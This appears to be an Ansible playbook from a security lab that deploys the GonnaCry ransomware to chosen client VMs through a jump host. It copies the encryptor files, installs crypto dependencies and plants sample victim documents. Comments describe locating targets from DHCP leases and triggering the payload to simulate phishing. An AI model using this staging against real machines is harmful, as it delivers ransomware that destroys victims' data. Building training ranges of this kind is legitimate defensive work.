---
# Deploy GonnaCry ransomware payload to target client VMs.
#
# Prerequisites: configure_c2.yml must have run (C2 server must be up).
#
# Edit target_ips to choose which clients receive the payload.
# Find client IPs on dhcp1:
#   awk -F',' 'NR>1 && $10=="0" {print $1}' /var/lib/kea/kea-leases4.csv
#
# After deployment, trigger manually on the client (simulates phishing execution):
#   cd ~/attacks/gonnacry && python3 main.py

- name: Stage GonnaCry on target clients
  hosts: localhost
  gather_facts: false

  vars:
    target_ips:
      - 10.10.20.157     # client2

  tasks:
    - name: Add target clients to dynamic inventory
      add_host:
        name: "{{ item }}"
        groups: gonnacry_targets
        ansible_user: "{{ client_user }}"
        ansible_password: "{{ client_password }}"
        ansible_ssh_common_args: >-
          -o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }}
          -o StrictHostKeyChecking=no
          -o UserKnownHostsFile=/dev/null
          -W %h:%p {{ infra_admin_user }}@{{ (vms | selectattr('name', 'equalto', 'gateway1') | first).wan_ip }}"
      loop: "{{ target_ips }}"

- name: Deploy GonnaCry payload
  hosts: gonnacry_targets
  become: true
  gather_facts: false

  tasks:
    - name: Create GonnaCry directory on client
      file:
        path: /home/{{ client_user }}/attacks/gonnacry
        state: directory
        owner: "{{ client_user }}"
        mode: '0755'

    - name: Copy GonnaCry encryptor files to client
      copy:
        src: "{{ project_root }}/GonnaCry/src/GonnaCry/{{ item }}"
        dest: /home/{{ client_user }}/attacks/gonnacry/{{ item }}
        owner: "{{ client_user }}"
        mode: '0644'
      loop:
        - main.py
        - asymmetric.py
        - symmetric.py
        - generate_keys.py
        - get_files.py
        - environment.py
        - utils.py
        - variables.py

    - name: Install python3-pip on client
      apt:
        name: python3-pip
        update_cache: true
        state: present

    - name: Install Python dependencies on client
      pip:
        name:
          - pycryptodome
          - requests
        executable: pip3

    - name: Create Documents directory on client
      file:
        path: /home/{{ client_user }}/Documents
        state: directory
        owner: "{{ client_user }}"
        mode: '0755'

    - name: Create sample target files for encryption demo
      copy:
        dest: /home/{{ client_user }}/Documents/{{ item.name }}
        content: "{{ item.content }}"
        owner: "{{ client_user }}"
        mode: '0644'
      loop:
        - name: company_report.txt
          content: |
            Q4 Financial Report
            Revenue: $2.4M
            Expenses: $1.8M
            Net: $0.6M
        - name: employee_data.csv
          content: |
            id,name,dept,salary
            1,Alice Smith,Engineering,95000
            2,Bob Jones,Marketing,72000
            3,Carol White,HR,68000
        - name: project_notes.txt
          content: |
            Project Phoenix - Confidential
            Deadline: Q1 2025
            Budget: $500K
            Status: In Progress
